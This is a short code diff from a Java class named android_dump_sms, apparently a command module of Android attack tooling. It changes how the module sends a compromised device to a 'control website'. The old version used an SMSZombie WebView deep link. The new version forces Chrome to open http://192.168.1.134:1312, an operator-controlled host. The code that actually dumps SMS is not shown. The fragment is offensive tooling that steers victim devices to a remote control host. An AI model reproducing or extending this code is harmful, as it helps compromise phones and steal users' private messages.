@@ -54,10 +54,11 @@ public class android_dump_sms implements Command {
 
         // Starts intent with deeplink to navigate SMSZombie's WebView to control website
         try {
-            Intent intent = new Intent("android.intent.action.VIEW",
-                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intent);
+        String url = "http://192.168.1.134:1312";
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setData(Uri.parse(url));
+        intent.setPackage("com.android.chrome");
+        context.startActivity(intent);
 
         } catch (ActivityNotFoundException e) {
           return ERROR_FAILURE;
